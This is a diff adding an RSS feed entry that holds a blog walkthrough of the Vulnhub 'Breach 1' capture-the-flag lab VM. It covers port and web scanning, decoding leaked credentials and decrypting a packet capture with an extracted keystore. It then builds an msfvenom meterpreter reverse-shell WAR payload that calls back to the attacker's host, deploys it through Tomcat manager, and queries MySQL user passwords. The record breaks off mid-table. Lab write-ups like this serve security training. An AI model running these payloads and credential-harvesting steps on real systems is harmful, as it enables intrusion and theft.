@@ -9,22 +9,620 @@
     <managingEditor>admin@camelinc.de</managingEditor>
     <webMaster>admin@camelinc.de</webMaster>
     <copyright>Copyright (c) 2014 - 2016; all rights reserved.</copyright>
-    <lastBuildDate>Sat, 25 Feb 2017 10:46:59 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 02 Mar 2017 10:46:59 +0000</lastBuildDate>
     <atom:link href="http://camelinc.info/post/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
-      <title>CTF - Mr Robot</title>
-      <link>http://camelinc.info/blog/2017/02/CTF---Mr-Robot/</link>
+      <title>Vulnhub - Breach 1 boot2root CTF walkthrough</title>
+      <link>http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/</link>
+      <pubDate>Thu, 02 Mar 2017 10:46:59 +0000</pubDate>
+      <author>admin@camelinc.de</author>
+      <guid>http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/</guid>
+      <description>
+
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Breach 1.0 is meant to be beginner to intermediate boot2root/CTF challenge.
+VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet.&lt;/p&gt;
+
+&lt;h1 id=&#34;information-gathering&#34;&gt;Information Gathering&lt;/h1&gt;
+
+&lt;p&gt;The VM is configured to the IP address 192.168.110.140.
+Let&amp;rsquo;s start by scanning the target via nmap.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ nmap -Pn -n -sS &lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.140 --top-ports &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; -v --open -oA target_&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date &lt;span class=&#34;s2&#34;&gt;&amp;quot;+%Y-%m-%d&amp;quot;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.40 scan initiated Wed Mar  1 13:34:26 2017 as: nmap -Pn -n -sS -v --open -oA target_2017-03-01 192.168.110.140&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.140
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;.0020s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+PORT      STATE SERVICE
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;/tcp     open  tcpmux
+&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;/tcp     open  compressnet
+&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;/tcp     open  unknown
+&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;/tcp     open  unknown
+&lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;/tcp     open  &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;/tcp     open  discard
+&lt;span class=&#34;m&#34;&gt;13&lt;/span&gt;/tcp    open  daytime
+&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;/tcp    open  qotd
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Awesome!
+Every port is open, that should be a piece of cake.
+Better try the web browser instead.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Uh, we&amp;#39;re gonna need to move your desk&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-1_0.png&#34; alt=&#34;Uh, we&amp;#39;re gonna need to move your desk&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So there is a web server with the picture of famous Milton Waddams.
+The text does not provide any direct pointers.
+The next step is to run nikto.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nikto -host &lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.140 -output target_&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date &lt;span class=&#34;s2&#34;&gt;&amp;quot;+%Y-%m-%d&amp;quot;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;.nikto -Format csv
+&lt;span class=&#34;go&#34;&gt;- Nikto v2.1.6&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Target IP:          192.168.110.140&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Target Hostname:    192.168.110.140&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Target Port:        80&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Start Time:         2017-03-01 13:54:26 (GMT-5)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Server: Apache/2.4.7 (Ubuntu)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Server leaks inodes via ETags, header found with file /, fields: 0x44a 0x534a04f49139d&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ The anti-clickjacking X-Frame-Options header is not present.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ No CGI Directories found (use &amp;#39;-C all&amp;#39; to force check all possible dirs)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ IP address found in the &amp;#39;location&amp;#39; header. The IP is &amp;quot;127.0.1.1&amp;quot;.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &amp;quot;http://127.0.1.1/images/&amp;quot;.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ OSVDB-3268: /images/: Directory indexing found.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ OSVDB-3233: /icons/README: Apache default file found.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ 7535 requests: 0 error(s) and 11 item(s) reported on remote host&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+ End Time:           2017-03-01 13:54:46 (GMT-5) (20 seconds)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;These results do not provide much help.
+Let&amp;rsquo;s try to find any other files and directories on the web server via gobuster.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; gobuster -u http://192.168.110.140 -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e -r -l -f
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.140/images/ (Status: 200) [Size: 1953]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; gobuster -u http://192.168.110.140 -w /usr/share/seclists/Discovery/Web_Content/raft-large-files.txt -e -r -l
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.140/index.html (Status: 200) [Size: 1098]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.140/style.css (Status: 200) [Size: 626]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.140/. (Status: 200) [Size: 1098]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.140/.gitignore (Status: 200) [Size: 42]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is much better.
+The images folder was also discovered by nikto.
+There are six files listed in the directory view.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webserver-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The contents of the image directory.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webserver-1_1.png&#34; alt=&#34;The contents of the image directory.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;One picture provides some clues where to look next.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/bill.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Thanks bill.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/bill.png&#34; alt=&#34;Thanks bill.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Thanks Bill!
+The hint provides the following information.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The hint is hidden in the source code.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-1_1.png&#34; alt=&#34;The hint is hidden in the source code.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo&amp;quot;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d   
+&lt;span class=&#34;gp&#34;&gt;pgibbons:damnitfeel$goodtobeagang$&lt;/span&gt;ta
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So these seem to be the login information for Peter Gibbons.
+The source code also points to the initech homepage.
+The homepage includes a link to the &amp;ldquo;Employee portal&amp;rdquo;.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-2_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Welcome to the employee portal.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-2_0.png&#34; alt=&#34;Welcome to the employee portal.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The previously discovered login credentials can be used to access the portal.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-2_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Welcome to the employee portal.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-2_1.png&#34; alt=&#34;Welcome to the employee portal.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Peter has got three new messages waiting in his inbox.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Message 1&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_0.png&#34; alt=&#34;Message 1&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Message 2&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_1.png&#34; alt=&#34;Message 2&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_2.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Message 3&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_2.png&#34; alt=&#34;Message 3&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;p&gt;So there is a hidden file on the webserver.
+After downloading we can identify the contents.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; curl -O &lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.140/.keystore
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; file .keystore
+&lt;span class=&#34;go&#34;&gt;keystore: Java KeyStore&lt;/span&gt;
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; keytool -list -keystore keystore
+&lt;span class=&#34;go&#34;&gt;Enter keystore password:  &lt;/span&gt;
+
+&lt;span class=&#34;go&#34;&gt;Keystore type: JKS&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Keystore provider: SUN&lt;/span&gt;
+
+&lt;span class=&#34;go&#34;&gt;Your keystore contains 1 entry&lt;/span&gt;
+
+&lt;span class=&#34;go&#34;&gt;tomcat, May 20, 2016, PrivateKeyEntry,&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Certificate fingerprint (SHA1): D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So we need a password to access the keystore.
+Thankfully, Bill sent Peter a memo that all security relevant information shall be posted in a particular section of the admin portal.
+Maybe the search yields some results.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_3.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;One results for &amp;#39;ssl&amp;#39;&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_3.png&#34; alt=&#34;One results for &amp;#39;ssl&amp;#39;&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_4.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Bill posts security relevant information in the portal.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/webseite-3_4.png&#34; alt=&#34;Bill posts security relevant information in the portal.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Bill mentioned a keystore in his post together with a password.
+Let&amp;rsquo;s try to extract the certificate from the keystore.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; keytool -exportcert -alias tomcat -file tomcat.der -keystore keystore
+&lt;span class=&#34;go&#34;&gt;Enter keystore password:  &lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Certificate stored in file &amp;lt;tomcat.der&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Enter destination keystore password:  &lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Re-enter new password:&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Enter source keystore password:  &lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Entry for alias tomcat successfully imported.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Import command completed:  1 entries successfully imported, 0 entries failed or cancelled&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;He also mentions a PCAP file, the we should probably download.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; curl -O http://192.168.110.140/impresscms/_SSL_test_phase1.pcap
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; file SSL_test_phase1.pcap
+&lt;span class=&#34;go&#34;&gt;SSL_test_phase1.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The pcap file contains a tcp session on port 8443/tcp that is garbled.
+This connection is probably encrypted.
+This is where the keystore might come in handy.
+In order to decrypt the traffic with wireshark we have to convert the keystore to PKCS12 format.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype PKCS12 -srcalias tomcat
+&lt;span class=&#34;go&#34;&gt;Enter destination keystore password:  &lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Re-enter new password:&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Enter source keystore password:&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now, open the packet capture in wireshark and set the options to decrypt the traffic.
+Set the respective options via &amp;ldquo;Edit&amp;rdquo;-&amp;gt;&amp;ldquo;Preferences&amp;rdquo;-&amp;gt;&amp;ldquo;Protocols&amp;rdquo;-&amp;gt;&amp;ldquo;SSL&amp;rdquo;.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/wireshark-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Set the options to decrypt ssl traffic.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/wireshark-1_0.png&#34; alt=&#34;Set the options to decrypt ssl traffic.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Now the magic happens and we can follow the cleartext session on port 8443/tcp between 192.168.110.140 and 192.168.110.129.
+Luckily, this is http which can be read like an open book.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/wireshark-1_2.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The decrypted SSL traffic.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/wireshark-1_2.png&#34; alt=&#34;The decrypted SSL traffic.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The Authorization header catches one&amp;rsquo;s eye immediately.
+The red team did a good job and probably discovered the password for the tomcat manager somewhere else.
+The base64 encoded credentials can be easily decoded.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;quot;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&amp;quot;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d
+&lt;span class=&#34;gp&#34;&gt;tomcat:Tt\5D8F(#&lt;/span&gt;!&lt;span class=&#34;se&#34;&gt;\*&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;4m7zB
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Trying to connect to the Tomcat manager did not immediately work out.
+Firefox was not able to connect to the service.
+So, the next tool to investigate was sslyze to get some details about the ssl configuration.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/sslyze-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Only the cipher suite RC4-MD5 is enabled.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/sslyze-1_0.png&#34; alt=&#34;Only the cipher suite RC4-MD5 is enabled.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The good news is, that there is a webserver.
+The bad news is, that the ssl configuration is unbelievably insecure.
+In order to connect with Firefox burp proxy was the tool of choice.
+With that proxying the ssl connection the browser could be utilized to access port 8443/tcp.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/tomcat-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The tomcat manager after a successful login.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/tomcat-1_0.png&#34; alt=&#34;The tomcat manager after a successful login.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;With admin access to tomcat manager the next step is to upload a custom WAR payload and smile.
+The easiest way to go is with a metasploit payload.
+The red team used a cmd shell to gain access to the web server, according to the packet capture.
+The easiest way would be to directly run the tomcat_mgr_deploy metasploit module.
+Another option is to manually create the payload, start the listener and upload the payload manually via the browser.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.129 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f war -o meterpreter.war
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; 7z l meterpreter.war
+&lt;span class=&#34;go&#34;&gt;Date      Time    Attr         Size   Compressed  Name&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;------------------- ----- ------------ ------------  ------------------------&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;2017-03-01 17:11:42 D....            0            0  META-INF&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;2017-03-01 17:11:42 .....           71           71  META-INF/MANIFEST.MF&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;2017-03-01 17:11:42 D....            0            0  WEB-INF&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;2017-03-01 17:11:42 .....          269          200  WEB-INF/web.xml&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;2017-03-01 17:11:42 .....         1779          733  uvbvrdgrpwdvzw.jsp&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;------------------- ----- ------------ ------------  ------------------------&lt;/span&gt;
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; msfconsole
+&lt;span class=&#34;go&#34;&gt;msf &amp;gt; use exploit/multi/handler&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;msf exploit(handler) &amp;gt; set PAYLOAD linux/x86/meterpreter/reverse_tcp&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;msf exploit(handler) &amp;gt; set LHOST 192.168.110.129&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And with a bit of luck, the session connects back to the server.
+Get lucky!&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The target opens a meterpreter session.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-1_0.png&#34; alt=&#34;The target opens a meterpreter session.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The next step is to elevate privileges on the system.
+The way to go would be setuid files or other exploits.
+Metasploits local_exploit_suggester might provide some pointers.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;These exploits might work according to metasploit.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-1_1.png&#34; alt=&#34;These exploits might work according to metasploit.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;After taking a look at the details for the exploits, it becomes obvious that none is applicable to the target system.
+Alternatives have to be identified.
+A search for setuid files does not yield any results either.
+Looking back at the messages from the portal, Bill Lumbergh mentioned his secure password.
+Challenge accepted.&lt;/p&gt;
+
+&lt;p&gt;One way to access his account information is via the CMS and an SQL injection.
+Another option would be to directly access the mysql database fomr the console.
+As his password is so secure, he might have stored it somewhere to remember it.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; mysql -u root
+&lt;span class=&#34;go&#34;&gt;Welcome to the MySQL monitor.  Commands end with ; or \g.&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Your MySQL connection id is 61&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Server version: 5.5.49-0ubuntu0.14.04.1 (Ubuntu)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;...&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;mysql&amp;gt; select User,Password from mysql.user;&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+------------------+-------------------------------------------+&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| User             | Password                                  |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+------------------+-------------------------------------------+&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| root             |                                           |&lt;/span&gt;
